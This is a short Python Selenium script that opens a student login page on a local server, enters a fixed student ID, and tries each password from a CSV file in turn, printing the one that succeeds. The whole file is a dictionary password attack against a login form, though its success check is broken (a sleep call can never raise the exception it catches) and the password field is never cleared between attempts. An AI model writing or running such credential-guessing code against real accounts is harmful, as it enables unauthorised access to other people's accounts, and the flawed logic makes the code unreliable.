import selenium
import csv
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

driver = webdriver.Firefox()
driver.get("http://127.0.0.1:8000/student/login/")

wait = WebDriverWait(driver, 10)
username_field = wait.until(EC.visibility_of_element_located((By.ID, "id_username")))

username_field.send_keys("21641A66J4")

with open('passwords.csv') as csv_file:
    csv_reader = csv.reader(csv_file, delimiter=',')

    for row in csv_reader:
        password = row[0]

        password_field = driver.find_element(By.CSS_SELECTOR, 'input[id="id_password"]')
        password_field.send_keys(password)

        login_button = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
        login_button.click()


        try:
            time.sleep(3)

        except selenium.common.exceptions.NoSuchElementException:
            print("Valid Login Credentials are: ")
            print(password)
            time.sleep(3)
            break

